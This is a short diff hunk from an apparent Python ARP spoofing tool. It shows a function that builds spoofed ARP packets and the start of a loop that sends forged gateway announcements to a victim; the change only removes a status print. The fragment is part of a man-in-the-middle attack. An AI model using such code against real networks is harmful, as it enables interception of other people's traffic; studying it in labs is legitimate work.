@@ -7,8 +7,6 @@ def build_arp_packet(src_ip, src_mac, dst_ip, dst_mac):  # Builds a spoofed ARP 
     return ether / arp  # Combine Ethernet and ARP layers
 
 def start_arp_spoofing(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, iface, stop_event, interval=2):
-    print("[*] Starting ARP spoofing...")
-
     try:
         while not stop_event.is_set():  # Check for stop signal
             pkt_to_victim = build_arp_packet(gateway_ip, attacker_mac, victim_ip, victim_mac)
